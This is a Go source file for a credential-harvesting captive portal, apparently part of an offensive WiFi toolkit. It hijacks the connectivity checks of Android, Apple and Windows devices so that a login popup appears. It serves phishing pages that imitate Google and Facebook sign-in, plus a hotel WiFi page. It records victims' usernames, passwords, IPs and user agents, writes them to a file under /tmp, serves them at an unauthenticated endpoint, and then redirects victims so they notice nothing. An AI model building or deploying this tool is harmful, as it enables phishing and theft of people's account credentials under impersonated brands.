package captive

import (
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

type Credential struct {
	Timestamp int64  `json:"timestamp"`
	IP        string `json:"ip"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	URL       string `json:"url"`
	UserAgent string `json:"user_agent"`
}

type PortalConfig struct {
	ListenAddr string `json:"listen_addr"` // default ":8080"
	Title      string `json:"title"`       // "WiFi Login" etc
	Template   string `json:"template"`    // "google", "facebook", "hotel", "custom"
	CustomHTML string `json:"custom_html"` // raw HTML if template=custom
	RedirectTo string `json:"redirect_to"` // where to send after cred capture
}

type Manager struct {
	config  PortalConfig
	creds   []Credential
	server  *http.Server
	running bool
	mu      sync.RWMutex
}

func NewManager() *Manager {
	return &Manager{}
}

func (m *Manager) Start(cfg PortalConfig) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.running {
		return fmt.Errorf("captive portal already running")
	}

	if cfg.ListenAddr == "" {
		cfg.ListenAddr = ":8080"
	}
	if cfg.Title == "" {
		cfg.Title = "WiFi Login"
	}
	if cfg.RedirectTo == "" {
		cfg.RedirectTo = "https://www.google.com"
	}
	if cfg.Template == "" {
		cfg.Template = "hotel"
	}

	m.config = cfg
	m.creds = nil

	mux := http.NewServeMux()
	mux.HandleFunc("/", m.handlePortal)
	mux.HandleFunc("/login", m.handleLogin)
	mux.HandleFunc("/generate_204", m.handleCaptiveCheck)  // Android
	mux.HandleFunc("/hotspot-detect.html", m.handleCaptiveCheck) // Apple
	mux.HandleFunc("/connecttest.txt", m.handleCaptiveCheck) // Windows
	mux.HandleFunc("/ncsi.txt", m.handleCaptiveCheck) // Windows alt
	mux.HandleFunc("/api/creds", m.handleGetCreds)

	m.server = &http.Server{
		Addr:    cfg.ListenAddr,
		Handler: mux,
	}

	go func() {
		log.Printf("captive: portal listening on %s (template: %s)", cfg.ListenAddr, cfg.Template)
		if err := m.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("captive: server error: %v", err)
		}
	}()

	m.running = true
	return nil
}

func (m *Manager) Stop() error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if !m.running {
		return nil
	}

	if m.server != nil {
		m.server.Close()
	}
	m.running = false
	log.Println("captive: portal stopped")
	return nil
}

func (m *Manager) IsRunning() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.running
}

func (m *Manager) GetConfig() PortalConfig {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.config
}

func (m *Manager) GetCreds() []Credential {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]Credential, len(m.creds))
	copy(result, m.creds)
	return result
}

func (m *Manager) ClearCreds() {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.creds = nil
}

// handleCaptiveCheck — respond in a way that triggers the OS captive portal popup
func (m *Manager) handleCaptiveCheck(w http.ResponseWriter, r *http.Request) {
	// Don't return 204 or the expected response — redirect to portal instead
	http.Redirect(w, r, "/", http.StatusFound)
}

func (m *Manager) handlePortal(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" && r.URL.Path != "" {
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}

	var html string
	switch m.config.Template {
	case "google":
		html = googleTemplate
	case "facebook":
		html = facebookTemplate
	case "hotel":
		html = hotelTemplate
	case "custom":
		html = m.config.CustomHTML
	default:
		html = hotelTemplate
	}

	tmpl, err := template.New("portal").Parse(html)
	if err != nil {
		http.Error(w, "template error", 500)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	tmpl.Execute(w, map[string]string{
		"Title": m.config.Title,
	})
}

func (m *Manager) handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}

	r.ParseForm()

	cred := Credential{
		Timestamp: time.Now().Unix(),
		IP:        r.RemoteAddr,
		Username:  r.FormValue("username"),
		Password:  r.FormValue("password"),
		URL:       r.Referer(),
		UserAgent: r.UserAgent(),
	}

	if cred.Username == "" {
		cred.Username = r.FormValue("email")
	}

	m.mu.Lock()
	m.creds = append(m.creds, cred)
	m.mu.Unlock()

	log.Printf("captive: credential captured from %s — user: %s", r.RemoteAddr, cred.Username)

	// Save to disk as well
	m.saveCred(cred)

	// Redirect to the "real" internet
	http.Redirect(w, r, m.config.RedirectTo, http.StatusFound)
}

func (m *Manager) handleGetCreds(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(m.GetCreds())
}

func (m *Manager) saveCred(cred Credential) {
	f, err := os.OpenFile("/tmp/cerberus-creds.json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()
	json.NewEncoder(f).Encode(cred)
}

// ─── Built-in portal templates ───────────────────────────────────────────────

var hotelTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{.Title}}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:40px;max-width:400px;width:90%}
h1{font-size:22px;color:#333;margin-bottom:8px}
p{color:#666;font-size:14px;margin-bottom:24px}
label{display:block;font-size:13px;color:#555;margin-bottom:4px;font-weight:500}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:16px;outline:none;transition:border .2s}
input:focus{border-color:#0071e3}
button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
button:hover{background:#0066cc}
.terms{font-size:11px;color:#999;margin-top:16px;text-align:center}
</style>
</head>
<body>
<div class="card">
<h1>{{.Title}}</h1>
<p>Please sign in to access the network</p>
<form method="POST" action="/login">
<label>Email Address</label>
<input type="email" name="email" placeholder="you@email.com" required>
<label>Password</label>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
<p class="terms">By connecting you agree to our Terms of Service</p>
</div>
</body>
</html>`

var googleTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Roboto,-apple-system,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;max-width:450px;width:90%}
.logo{text-align:center;margin-bottom:16px}
.logo svg{width:75px;height:24px}
h1{font-size:24px;color:#202124;text-align:center;font-weight:400;margin-bottom:8px}
.subtitle{text-align:center;color:#202124;font-size:16px;margin-bottom:24px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:20px;outline:none}
input:focus{border:2px solid #1a73e8;padding:12px 14px}
button{background:#1a73e8;color:#fff;border:none;padding:12px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;float:right}
button:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.footer{clear:both;padding-top:32px}
a{color:#1a73e8;font-size:14px;text-decoration:none}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><text x="0" y="20" font-size="22" font-family="Product Sans,Arial" font-weight="500"><tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc05">o</tspan><tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan></text></svg>
</div>
<h1>Sign in</h1>
<p class="subtitle">to continue to WiFi</p>
<form method="POST" action="/login">
<input type="email" name="username" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Enter your password" required>
<a href="#">Forgot password?</a>
<div class="footer">
<button type="submit">Next</button>
</div>
</form>
</div>
</body>
</html>`

var facebookTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in to Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
.logo{color:#1877f2;font-size:48px;font-weight:700;margin-bottom:16px;font-family:Klavika,Helvetica,Arial}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;max-width:396px;width:90%}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
button:hover{background:#166fe5}
.divider{border-top:1px solid #dadde1;margin:20px 0}
.create{display:block;text-align:center;background:#42b72a;color:#fff;padding:12px;border-radius:6px;font-size:17px;font-weight:600;text-decoration:none;margin-top:12px}
a{color:#1877f2;text-align:center;display:block;font-size:14px}
</style>
</head>
<body>
<div class="logo">facebook</div>
<div class="card">
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Email address or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
<a href="#">Forgotten password?</a>
<div class="divider"></div>
<a href="#" class="create">Create New Account</a>
</form>
</div>
</body>
</html>`
